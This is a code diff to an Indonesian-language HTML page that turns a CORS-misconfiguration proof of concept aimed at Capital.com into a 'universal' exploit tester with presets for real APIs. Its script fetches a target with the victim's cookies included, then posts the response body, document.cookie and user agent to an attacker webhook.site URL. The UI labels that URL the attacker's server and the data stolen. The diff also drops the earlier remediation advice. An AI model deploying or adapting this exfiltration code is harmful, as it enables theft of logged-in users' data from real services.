@@ -3,11 +3,8 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CORS Exploit - Proof of Concept</title>
+    <title>CORS Exploit - Universal Tester</title>
     <style>
-        /* ==========================================
-               RESET & BASE
-            ========================================== */
         * {
             margin: 0;
             padding: 0;
@@ -29,16 +26,12 @@
             background: #18182e;
             border-radius: 16px;
             padding: 35px 30px 30px;
-            max-width: 820px;
+            max-width: 850px;
             width: 100%;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
             border: 1px solid #2a2a4a;
-            transition: all 0.3s ease;
         }
 
-        /* ==========================================
-               HEADER
-            ========================================== */
         .header {
             text-align: center;
             margin-bottom: 25px;
@@ -72,9 +65,6 @@
             margin-top: 6px;
         }
 
-        /* ==========================================
-               INPUT GROUP
-            ========================================== */
         .input-group {
             margin-bottom: 16px;
         }
@@ -88,8 +78,14 @@
             letter-spacing: 0.3px;
         }
 
+        .input-group .input-wrapper {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
         .input-group input {
-            width: 100%;
+            flex: 1;
             padding: 11px 15px;
             border-radius: 10px;
             border: 1px solid #2e2e4e;
@@ -105,9 +101,74 @@
             border-color: #ff4d6d;
         }
 
-        /* ==========================================
-               BUTTON
-            ========================================== */
+        .input-group input::placeholder {
+            color: #555577;
+        }
+
+        .input-group small {
+            color: #8888aa;
+            font-size: 12px;
+            margin-top: 4px;
+            display: block;
+        }
+
+        .input-group small a {
+            color: #ff4d6d;
+            text-decoration: none;
+        }
+
+        .input-group small a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-random {
+            background: #2a2a5a;
+            color: #aaaacc;
+            border: 1px solid #3a3a6a;
+            padding: 10px 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .btn-random:hover {
+            background: #3a3a7a;
+            border-color: #ff4d6d;
+            color: #fff;
+        }
+
+        .btn-random:active {
+            transform: scale(0.95);
+        }
+
+        .presets {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .preset-btn {
+            background: #1a1a3a;
+            color: #8888bb;
+            border: 1px solid #2a2a5a;
+            padding: 6px 14px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.2s;
+        }
+
+        .preset-btn:hover {
+            background: #2a2a5a;
+            border-color: #ff4d6d;
+            color: #fff;
+        }
+
         .btn-exploit {
             background: #ff4d6d;
             color: #fff;
@@ -137,9 +198,6 @@
             opacity: 0.6;
         }
 
-        /* ==========================================
-               STATUS BAR
-            ========================================== */
         .status-bar {
             text-align: center;
             font-size: 14px;
@@ -153,15 +211,12 @@
             color: #ffcc00;
         }
 
-        /* ==========================================
-               LOG BOX (TERMINAL STYLE)
-            ========================================== */
         .log-box {
             background: #0a0a18;
             border: 1px solid #26264a;
             border-radius: 12px;
             padding: 16px 18px;
-            max-height: 400px;
+            max-height: 450px;
             overflow-y: auto;
             font-family: 'Courier New', Consolas, monospace;
             font-size: 13px;
@@ -187,13 +242,7 @@
         .log-box .gray {
             color: #7788aa;
         }
-        .log-box .bold {
-            font-weight: 700;
-        }
 
-        /* ==========================================
-               SCROLLBAR STYLING
-            ========================================== */
         .log-box::-webkit-scrollbar {
             width: 6px;
         }
@@ -205,9 +254,6 @@
             border-radius: 8px;
         }
 
-        /* ==========================================
-               FOOTER
-            ========================================== */
         .footer {
             margin-top: 20px;
             font-size: 12px;
@@ -222,10 +268,7 @@
             color: #ff4d6d;
         }
 
-        /* ==========================================
-               RESPONSIVE
-            ========================================== */
-        @media (max-width: 500px) {
+        @media (max-width: 600px) {
             .container {
                 padding: 20px 16px;
             }
@@ -237,6 +280,13 @@
                 padding: 12px 14px;
                 max-height: 300px;
             }
+            .input-group .input-wrapper {
+                flex-direction: column;
+            }
+            .btn-random {
+                width: 100%;
+                justify-content: center;
+            }
         }
     </style>
 </head>
@@ -247,24 +297,44 @@
         <!-- ========== HEADER ========== -->
         <div class="header">
             <h1>
-                ⚡ CORS Exploit PoC
-                <span>Wildcard (*)</span>
+                ⚡ CORS Exploit Tester
+                <span>Universal</span>
             </h1>
             <div class="subtitle">
                 Proof of Concept — CORS Misconfiguration &amp; Data Exfiltration
             </div>
         </div>
 
+        <!-- ========== QUICK PRESETS ========== -->
+        <div class="presets">
+            <button class="preset-btn" onclick="setTarget('https://api.mycapital.capital.com/')">🎯 Capital.com</button>
+            <button class="preset-btn" onclick="setTarget('https://api.github.com/')">🐙 GitHub API</button>
+            <button class="preset-btn" onclick="setTarget('https://jsonplaceholder.typicode.com/posts/1')">📝 JSONPlaceholder</button>
+            <button class="preset-btn" onclick="setTarget('https://httpbin.org/get')">🔧 httpbin</button>
+            <button class="preset-btn" onclick="randomTarget()">🎲 Random</button>
+        </div>
+
         <!-- ========== INPUT TARGET ========== -->
         <div class="input-group">
             <label>🎯 Target API</label>
-            <input type="text" id="targetUrl" value="https://api.mycapital.capital.com/" />
+            <div class="input-wrapper">
+                <input type="text" id="targetUrl" 
+                       value="" 
+                       placeholder="https://api.example.com/endpoint" />
+                <button class="btn-random" onclick="randomTarget()">🎲 Random</button>
+            </div>
         </div>
 
         <!-- ========== INPUT WEBHOOK ========== -->
         <div class="input-group">
             <label>📤 Server Penyerang (Webhook)</label>
-            <input type="text" id="exfilUrl" value="https://webhook.site/4b9a010c-3e6f-457f-bb62-2f2cec3f559c" />
+            <input type="text" id="exfilUrl" 
+                   value="" 
+                   placeholder="https://webhook.site/your-unique-id" />
+            <small>
+                🔗 Dapatkan URL gratis di <a href="https://webhook.site" target="_blank">webhook.site</a>
+                — data curian akan muncul di dashboard Anda
+            </small>
         </div>
 
         <!-- ========== BUTTON ========== -->
@@ -274,7 +344,7 @@
 
         <!-- ========== STATUS ========== -->
         <div class="status-bar" id="statusBar">
-            ⏳ Siap — pastikan Anda <span class="highlight">login</span> ke Capital.com di tab lain
+            ⏳ Siap — pastikan Anda <span class="highlight">login</span> ke target di tab lain
         </div>
 
         <!-- ========== LOG TERMINAL ========== -->
@@ -333,6 +403,35 @@
         }
 
         // ==========================================
+        //  RANDOM TARGET
+        // ==========================================
+        function randomTarget() {
+            const targets = [
+                'https://api.mycapital.capital.com/',
+                'https://api.github.com/',
+                'https://jsonplaceholder.typicode.com/posts/1',
+                'https://httpbin.org/get',
+                'https://api.example.com/data',
+                'https://httpbin.org/anything',
+                'https://reqres.in/api/users/1',
+                'https://api.spacexdata.com/v3/launches/latest'
+            ];
+            const random = targets[Math.floor(Math.random() * targets.length)];
+            targetInput.value = random;
+            localStorage.setItem('cors_target', random);
+            log(`🎲 Random target: ${random}`, 'yellow');
+        }
+
+        // ==========================================
+        //  SET TARGET (Preset)
+        // ==========================================
+        function setTarget(url) {
+            targetInput.value = url;
+            localStorage.setItem('cors_target', url);
+            log(`📌 Preset target: ${url}`, 'blue');
+        }
+
+        // ==========================================
         //  FUNGSI EKSPLOIT UTAMA
         // ==========================================
         async function runExploit() {
@@ -346,8 +445,25 @@
             const targetUrl = targetInput.value.trim();
             const exfilUrl = exfilInput.value.trim();
 
-            if (!targetUrl || !exfilUrl) {
-                log('❌ Target dan Webhook URL harus diisi!', 'red');
+            if (!targetUrl) {
+                log('❌ Target URL harus diisi!', 'red');
+                isRunning = false;
+                return;
+            }
+
+            if (!exfilUrl) {
+                log('❌ Webhook URL harus diisi!', 'red');
+                log('💡 Dapatkan URL gratis di https://webhook.site', 'yellow');
+                isRunning = false;
+                return;
+            }
+
+            // Validasi URL
+            try {
+                new URL(targetUrl);
+                new URL(exfilUrl);
+            } catch (e) {
+                log('❌ URL tidak valid! Pastikan formatnya benar (contoh: https://...)', 'red');
                 isRunning = false;
                 return;
             }
@@ -363,7 +479,7 @@
 
                 const response = await fetch(targetUrl, {
                     method: 'GET',
-                    credentials: 'include', // 🔑 Kirim cookie!
+                    credentials: 'include',
                     headers: {
                         'Accept': 'application/json',
                         'Content-Type': 'application/json'
@@ -382,16 +498,19 @@
                 const contentType = response.headers.get('content-type') || '';
 
                 if (contentType.includes('application/json')) {
-                    const jsonData = await response.json();
-                    rawData = JSON.stringify(jsonData, null, 2);
+                    try {
+                        const jsonData = await response.json();
+                        rawData = JSON.stringify(jsonData, null, 2);
+                    } catch (e) {
+                        rawData = await response.text();
+                    }
                 } else {
                     rawData = await response.text();
                 }
 
-                // Tampilkan data (potong jika terlalu panjang)
                 log(`📦 Data yang diterima:`, 'blue');
-                const displayData = rawData.length > 600 ? rawData.substring(0, 600) + '...\n[truncated]' : rawData;
-                log(displayData, 'green');
+                const displayData = rawData.length > 800 ? rawData.substring(0, 800) + '...\n[truncated]' : rawData;
+                log(displayData || '(empty response)', 'green');
 
                 // ==========================================
                 //  STEP 3 — EKSFILTRASI KE WEBHOOK
@@ -404,14 +523,20 @@
                     data: rawData,
                     userAgent: navigator.userAgent,
                     origin: window.location.origin,
-                    cookie: document.cookie || '(HttpOnly - tidak bisa dibaca JS)'
+                    cookie: document.cookie || '(HttpOnly - tidak bisa dibaca JS)',
+                    headers: {
+                        'Content-Type': contentType,
+                        'Access-Control-Allow-Origin': response.headers.get('access-control-allow-origin') || 'not set',
+                        'Access-Control-Allow-Credentials': response.headers.get('access-control-allow-credentials') ||
+                            'not set'
+                    }
                 };
 
                 log(`📤 Mengirim data ke server penyerang: ${exfilUrl}`, 'blue');
 
                 await fetch(exfilUrl, {
                     method: 'POST',
-                    mode: 'no-cors', // 🔓 Supaya tidak diblokir CORS
+                    mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/json'
                     },
@@ -425,25 +550,33 @@
                 //  STEP 4 — KESIMPULAN
                 // ==========================================
                 log('', 'gray');
-                if (status === 200) {
-                    log('✅✅✅ EKSPLOIT SUKSES! Data sensitif berhasil dicuri!', 'green');
-                    log('🔴 Ini adalah BUKTI KERENTANAN CORS yang valid.', 'red');
-                } else if (status === 403) {
-                    log('⚠️ Status 403: Belum login ke Capital.com', 'yellow');
-                    log('✅ TAPI CORS tetap longgar!', 'green');
-                    log('🔴 Jika user SUDAH LOGIN, data BISA dicuri!', 'red');
-                    log('🔴 Ini tetap BUKTI KERENTANAN yang valid.', 'red');
+                
+                const corsOrigin = response.headers.get('access-control-allow-origin');
+                const corsCredentials = response.headers.get('access-control-allow-credentials');
+
+                if (corsOrigin) {
+                    log(`🔴 CORS HEADER DETECTED!`, 'red');
+                    log(`   Access-Control-Allow-Origin: ${corsOrigin}`, 'yellow');
+                    if (corsCredentials) {
+                        log(`   Access-Control-Allow-Credentials: ${corsCredentials}`, 'yellow');
+                    }
+                    log('', 'gray');
+                    log('⚠️ Server mengizinkan akses lintas-domain!', 'red');
+                    log('💥 Jika user login, data sensitif bisa dicuri!', 'red');
                 } else {
-                    log(`ℹ️ Status ${status} — perlu analisis lebih lanjut.`, 'yellow');
+                    log('🟢 Tidak ada CORS header yang terdeteksi.', 'green');
+                    log('✅ Kemungkinan server aman dari CORS misconfiguration.', 'green');
                 }
 
-                log('', 'gray');
-                log('📋 REKOMENDASI UNTUK KLIEN:', 'yellow');
-                log('  1. Hapus Access-Control-Allow-Origin: *', 'yellow');
-                log('  2. Gunakan whitelist domain yang valid', 'yellow');
-                log('  3. Jangan gunakan credentials: true dengan origin *', 'yellow');
+                if (status === 200) {
+                    log('✅✅✅ EKSPLOIT SUKSES! Data sensitif berhasil dicuri!', 'green');
+                } else if (status === 403 || status === 401) {
+                    log('⚠️ Status 403/401: Server membutuhkan autentikasi', 'yellow');
+                    log('✅ TAPI CORS header sudah terdeteksi!', 'green');
+                    log('🔴 Jika user SUDAH LOGIN, data BISA dicuri!', 'red');
+                }
 
-                setStatus('✅ Selesai — CORS Vulnerable!', false);
+                setStatus('✅ Selesai — ' + (corsOrigin ? 'CORS Vulnerable!' : 'CORS Aman'), false);
 
             } catch (error) {
                 log(`❌ Error: ${error.message}`, 'red');
@@ -461,12 +594,46 @@
         }
 
         // ==========================================
-        //  AUTO-RUN — INSTRUKSI AWAL
+        //  AUTO-RUN — LOAD SAVED DATA
         // ==========================================
         window.onload = function() {
+            // Load dari localStorage
+            const savedTarget = localStorage.getItem('cors_target');
+            const savedWebhook = localStorage.getItem('cors_webhook');
+            
+            if (savedTarget) {
+                targetInput.value = savedTarget;
+            }
+            if (savedWebhook) {
+                exfilInput.value = savedWebhook;
+            }
+
+            // Simpan ke localStorage saat input berubah
+            targetInput.addEventListener('change', function() {
+                localStorage.setItem('cors_target', this.value);
+            });
+            targetInput.addEventListener('input', function() {
+                localStorage.setItem('cors_target', this.value);
+            });
+            
+            exfilInput.addEventListener('change', function() {
+                localStorage.setItem('cors_webhook', this.value);
+            });
+            exfilInput.addEventListener('input', function() {
+                localStorage.setItem('cors_webhook', this.value);
+            });
+
             log('[+] Halaman PoC siap', 'blue');
-            log('📌 Pastikan Anda sudah <span class="yellow">login</span> ke Capital.com di tab lain', 'yellow');
-            log('💡 Klik tombol untuk menjalankan exploit', 'blue');
+            log('📌 Masukkan target API atau gunakan preset di atas', 'blue');
+            log('📤 Masukkan Webhook URL dari webhook.site', 'blue');
+            log('🔑 Pastikan Anda login ke target di tab lain', 'yellow');
+            
+            if (savedTarget) {
+                log(`💾 Target terakhir: ${savedTarget}`, 'gray');
+            }
+            if (savedWebhook) {
+                log(`💾 Webhook terakhir: ${savedWebhook}`, 'gray');
+            }
         };
     </script>
 
